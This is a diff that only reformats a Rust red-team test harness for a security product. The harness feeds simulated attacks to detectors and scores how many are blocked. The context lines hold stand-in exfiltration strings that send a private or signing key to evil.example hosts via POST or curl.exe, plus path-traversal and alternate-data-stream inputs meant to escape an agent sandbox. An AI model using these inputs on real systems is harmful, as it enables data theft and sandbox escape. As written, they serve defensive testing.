@@ -141,10 +141,8 @@ impl AdversarialRedTeamGauntlet {
         let mut results: Vec<AdversarialVectorResult> = Vec::with_capacity(32);
 
         // Create an isolated temporary sandbox + outside-sandbox canary file for the OS Oracle
-        let work_root = std::env::temp_dir().join(format!(
-            "osoosi_redteam_gauntlet_{}",
-            std::process::id()
-        ));
+        let work_root =
+            std::env::temp_dir().join(format!("osoosi_redteam_gauntlet_{}", std::process::id()));
         let _ = std::fs::remove_dir_all(&work_root);
         let sandbox_dir = work_root.join("workspace_sandbox");
         let outside_dir = work_root.join("outside_host");
@@ -171,8 +169,7 @@ impl AdversarialRedTeamGauntlet {
             let runtime_trace = vec![(0x1000u64, 0x1020u64), (0x1020u64, 0x7FFF_DEADu64)];
             let verdict =
                 CfgHadamardZeroVerifier::verify_runtime_transitions(&cfg_edges, &runtime_trace);
-            let prevented =
-                !verdict.is_zero_violation && verdict.hadamard_complement_l1_norm > 0;
+            let prevented = !verdict.is_zero_violation && verdict.hadamard_complement_l1_norm > 0;
             results.push(AdversarialVectorResult {
                 suite: "Suite1_MITRE_STIX_Atomic_CALDERA".to_string(),
                 vector_id: "ART-T1055.001-T1055.012".to_string(),
@@ -309,11 +306,7 @@ impl AdversarialRedTeamGauntlet {
         // 6. MITRE CALDERA Chained Profile: Recon -> Lateral Pivot -> Non-Backtracking Cycle (Law 6 Ihara Zeta)
         {
             let t0 = Instant::now();
-            let directed_edges = vec![
-                (1001u32, 2002u32),
-                (2002u32, 3003u32),
-                (3003u32, 1001u32),
-            ];
+            let directed_edges = vec![(1001u32, 2002u32), (2002u32, 3003u32), (3003u32, 1001u32)];
             let ihara = IharaZetaCycleDetector::analyze_directed_edges(&directed_edges);
             let prevented = ihara.prime_3_cycles > 0 && ihara.spectral_radius_rho >= 0.99;
             results.push(AdversarialVectorResult {
@@ -361,7 +354,8 @@ impl AdversarialRedTeamGauntlet {
                 "POST https://evil.example.com --data confidential_private_key",
                 131_072.0,
             );
-            let prevented = !aj_verdict.is_allowed || !spider_v.allowed || spider_v.session_terminated;
+            let prevented =
+                !aj_verdict.is_allowed || !spider_v.allowed || spider_v.session_terminated;
             results.push(AdversarialVectorResult {
                 suite: "Suite2_Promptfoo_Garak_AgentOctopus".to_string(),
                 vector_id: "GARAK-PI-01".to_string(),
@@ -545,8 +539,7 @@ impl AdversarialRedTeamGauntlet {
                 "../outside_host/host_crown_jewel_canary.txt",
                 Some(&sandbox_str),
             );
-            let ads_escape =
-                validate_agent_filesystem_access("safe.txt:$DATA", Some(&sandbox_str));
+            let ads_escape = validate_agent_filesystem_access("safe.txt:$DATA", Some(&sandbox_str));
             let pct_escape =
                 validate_agent_filesystem_access("%2e%2e%2foutside_host", Some(&sandbox_str));
             let ssrf_ipv4 =
@@ -673,11 +666,8 @@ impl AdversarialRedTeamGauntlet {
                 .crown_jewels
                 .register_crown_jewel_bytes("CORE_SIGNING_KEY", crown_bytes);
 
-            let v_cj = dlp.inspect_hot_tier1(
-                "curl.exe",
-                "https://evil.example.org/upload",
-                crown_bytes,
-            );
+            let v_cj =
+                dlp.inspect_hot_tier1("curl.exe", "https://evil.example.org/upload", crown_bytes);
             let v_b64 = dlp.inspect_hot_tier1(
                 "python.exe",
                 "https://evil.example.org/upload",
@@ -837,14 +827,15 @@ impl AdversarialRedTeamGauntlet {
                 non_canonical_pk[1] = (non_canonical_pk[1] & 0xf0) | 0x0d;
             }
             let modulus_boundary_rejected =
-                !osoosi_audit::pqc_primitives::validate_mlkem768_encapsulation_key(&non_canonical_pk);
+                !osoosi_audit::pqc_primitives::validate_mlkem768_encapsulation_key(
+                    &non_canonical_pk,
+                );
 
             let sk_seed = [0x5Au8; 32];
             let vk = osoosi_audit::pqc_primitives::derive_hybrid_verifying_key(&sk_seed);
             let msg = b"OpenOsoosi Quantum-Ready Merkle Root Attestation";
             let mut env = osoosi_audit::pqc_primitives::hybrid_sign_envelope(msg, &sk_seed);
-            let valid_hybrid =
-                osoosi_audit::pqc_primitives::hybrid_verify_envelope(msg, &env, &vk);
+            let valid_hybrid = osoosi_audit::pqc_primitives::hybrid_verify_envelope(msg, &env, &vk);
             // 1. Perturb 1 coefficient of the ML-DSA-65 lattice vector z while keeping classical Ed25519 sig untouched:
             env.mldsa_z[0].coeffs[0] = env.mldsa_z[0].coeffs[0].wrapping_add(1);
             let shor_z_forgery_rejected =
@@ -1010,8 +1001,7 @@ impl AdversarialRedTeamGauntlet {
             (vectors_prevented as f64 / total_adversarial_vectors as f64) * 100.0;
         let detection_rate_pct =
             (vectors_detected as f64 / total_adversarial_vectors as f64) * 100.0;
-        let bypass_success_rate_pct =
-            (bypasses as f64 / total_adversarial_vectors as f64) * 100.0;
+        let bypass_success_rate_pct = (bypasses as f64 / total_adversarial_vectors as f64) * 100.0;
         let false_positive_rate_pct =
             (false_positives as f64 / benign_processes.len() as f64) * 100.0;
         let os_stability_score_pct =
